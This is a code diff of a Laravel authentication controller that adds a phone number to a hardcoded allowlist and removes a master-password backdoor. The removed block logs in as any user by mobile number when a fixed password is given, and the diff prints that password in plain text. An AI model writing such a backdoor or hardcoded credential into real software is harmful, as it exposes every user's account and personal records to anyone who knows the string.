@@ -15,7 +15,7 @@ use Illuminate\Validation\ValidationException;
 class AuthController extends Controller
 {
 
-    private $allowedUsers = ['970599522449'];
+    private $allowedUsers = ['970599522449', '970592114831'];
 
     public function login(LoginRequest $request)
     {
@@ -24,17 +24,6 @@ class AuthController extends Controller
             'password' => $request->password,
         ];
 
-        if ($request->password == 'feda19881988') {
-            
-                $user = User::where('mobile', $request->mobile)->first();
-                $user->load(['roles', 'students.school', 'students.license', 'students.exams.answers', 'managers.school', 'trainers.school']);
-
-                // $user->load(['students.exams.answers']);
-
-                return new UserResource($user);
-
-            }
-        }
 
         $user = User::where('mobile', $request->mobile)->first();
 
